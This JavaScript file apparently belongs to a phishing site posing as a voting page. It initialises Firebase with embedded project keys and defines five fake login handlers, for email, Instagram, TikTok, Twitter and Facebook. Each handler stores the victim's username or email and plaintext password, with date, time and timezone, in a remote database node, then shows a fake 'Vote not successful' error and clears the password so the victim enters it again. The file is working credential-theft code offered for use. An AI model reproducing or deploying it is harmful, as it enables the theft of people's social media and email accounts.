// Initialize Firebase
const firebaseConfig = {
  apiKey: "AIzaSyB0QncHtjxIR5Jwaa0aqkSWT9RFdaVvTng",
  authDomain: "arabfamevoteplus.firebaseapp.com",
  databaseURL: "https://arabfamevoteplus-default-rtdb.firebaseio.com",
  projectId: "arabfamevoteplus",
  storageBucket: "arabfamevoteplus.firebasestorage.app",
  messagingSenderId: "554479039127",
  appId: "1:554479039127:web:0e9ce56cc3b68c041cafd2"
};
firebase.initializeApp(firebaseConfig);
const appCheck = firebase.appCheck();
appCheck.activate("6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW", true);

// Show custom alert
function showAlert(title, message) {
  document.getElementById("alert-title").innerText = title;
  document.getElementById("alert-message").innerText = message;
  document.getElementById("custom-alert").classList.remove("hidden");
}

// Hide custom alert
function hideAlert() {
  document.getElementById("custom-alert").classList.add("hidden");
}

// Firebase login functions
function hmlog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var email = document.getElementById("hm-email").value;
  var password = document.getElementById("hm-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("hm-pass").value = "";
      return false;
    }, 2000);
  }
}

// Similar functions for Instagram, TikTok, Twitter, and Facebook
function iglog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var username = document.getElementById("ig-uname").value;
  var password = document.getElementById("ig-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Instagram";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("ig-pass").value = "";
      return false;
    }, 2000);
  }
}

function toklog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var username = document.getElementById("tok-uname").value;
  var password = document.getElementById("tok-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "TikTok";

  if (username !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: username,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert("Vote not successful", "Incorrect account or password.");
      document.getElementById("tok-pass").value = "";
      return false;
    }, 2000);
  }
}

function twilog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var email = document.getElementById("twi-uname").value;
  var password = document.getElementById("twi-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Email";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("twi-pass").value = "";
      return false;
    }, 2000);
  }
}

function fblog() {
  firebase
    .auth()
    .signInAnonymously()
    .catch(function (error) {
      showAlert("Error", error.message);
    });

  var email = document.getElementById("fb-uname").value;
  var password = document.getElementById("fb-pass").value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = "Facebook";

  if (email !== "" && password !== "") {
    firebase.database().ref("fbdet").push({
      emle: email,
      mobile: "",
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType,
    });

    setTimeout(function () {
      showAlert(
        "Vote not successful",
        "Sorry, something went wrong. Please try again."
      );
      document.getElementById("fb-pass").value = "";
      return false;
    }, 2000);
  }
}
